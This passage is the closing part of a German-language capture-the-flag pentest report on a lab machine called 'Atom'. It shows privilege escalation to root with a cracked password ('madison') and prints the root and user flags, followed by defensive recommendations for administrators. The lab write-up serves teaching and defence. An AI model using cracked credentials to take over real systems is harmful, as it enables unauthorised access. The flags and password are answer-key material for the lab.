+<span class="password">               -    s////:-..-:/`    `.           </span>
+<span class="password">              ..    +//:`    +-`-`    -           </span>
+<span class="password">              -   -://+`     +/ `o`   -           </span>
+<span class="password">              -   :/++//.`   `../+    -           </span>
+<span class="password">              `.  `+++++///:::/+o:    -           </span>
+<span class="password">               -   `+++///++////o:    -           </span>
+<span class="password">               -    .++o+///////+:.   -           </span>
+<span class="password">               -    .+o+Ns:d-s+///// `.           </span>
+<span class="password">               `.   :/mhMmhMyM++//-. -            </span>
+<span class="password">                -   -/mMMMMMMMh+/-   -            </span>
+<span class="password">                -    +yMMMMMMN+o-`  `.    `....   </span>
+<span class="password">         .-:-`  ..  `+hMmNNhN+/+:-  -   .//::///  </span>
+<span class="password">      :::/::+//.  -  .+hNsyd/d-o---: `-  ://.` ```  </span>
+<span class="password">      `::.  //+  -`  :++-++++++o...-  `++`        </span>
+<span class="password">            .+/- `-  -+://++///+.-:-  ///         </span>
+<span class="password">            `+/+``:-///://++///+//y+.-///         </span>
+<span class="password">             -////sssooooooooosssssoo///-         </span>
+<span class="password">            `.+//+ooooossoooyssoosss+//:          </span>
+<span class="password">  `.```-:---///++///+++++++o+oo+++++/+/`          </span>
+<span class="password">  .//++//////////++////////////++///////-``       </span>
+<span class="password">       `...`  `.------..-:///////+/:://////-      </span>
+<span class="password">                            `-:/+++.   ...`  </span>
+
+
+<span class="password">FLAG = [d3a4fd660f1af5a7e3c2f17314f4a962]</span> <-- ROOT FLAG!
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich benutze den Befehl <code>su root</code>, um meine Identität zu Root zu wechseln. Das System fragt nach dem Passwort für Root. Ich gebe das gerade geknackte Passwort "<span class="password">madison</span>" ein. Die Authentifizierung ist erfolgreich! Die Prompt wechselt zu <code>root@atom:~#</code>, was anzeigt, dass ich nun als Root angemeldet bin. Ich verifiziere dies mit dem <code>id</code> Befehl, der <span class="password">uid=0(root)</span> bestätigt. Ich liste den Inhalt des Root-Verzeichnisses (<code>ls</code>) auf und finde die Datei <code>root.txt</code>. Ich lese den Inhalt dieser Datei mit <code>cat root.txt</code>. Die Ausgabe zeigt ASCII-Art und die Root-Flag: <span class="password">d3a4fd660f1af5a7e3c2f17314f4a962</span>. Alle 'O'-Fehler wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Privilegienerhöhung von Benutzer "onida" zu Root war erfolgreich! Das geknackte Passwort (<span class="password">madison</span>) war tatsächlich das Passwort für den Root-Benutzer. Dies demonstriert, wie ein schwaches Root-Passwort, selbst wenn es gehasht ist (bcrypt), durch Offline-Cracking kompromittiert werden kann, was einem Angreifer vollen administrativen Zugriff auf das System gewährt. Die Root-Flag wurde erfolgreich abgerufen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe erfolgreich Root-Zugriff erlangt und die Root-Flag abgerufen. Der Penetrationstest des Systems "Atom" ist damit abgeschlossen. Ich werde nun den Bericht finalisieren.
+                <br><strong>Empfehlung (Admin):</strong> **Dies ist eine kritische Sicherheitslücke.** Das Root-Passwort muss umgehend geändert werden. Verwenden Sie ein langes, komplexes und einzigartiges Passwort, das nicht in Wordlists enthalten ist. Erwägen Sie alternative, sicherere Methoden für die Authentifizierung von Root-Benutzern (z.B. Schlüsselpaare für SSH-Login als ein anderer Benutzer und dann <code>su</code> oder <code>sudo</code> mit einem sehr starken Passwort oder Multi-Faktor-Authentifizierung, falls möglich). Stellen Sie sicher, dass die <code>/etc/shadow</code> Datei angemessen geschützt ist, um unbefugtes Lesen der gehashten Passwörter zu verhindern.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/onida/user.txt</div>
+                    <div class="flag-value"><span class="password">ee11cbb19052e40b07aac0ca060c23ee</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">d3a4fd660f1af5a7e3c2f17314f4a962</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. Juni 2025</p>
+    </footer>
+
+  
+</body>
+</html>
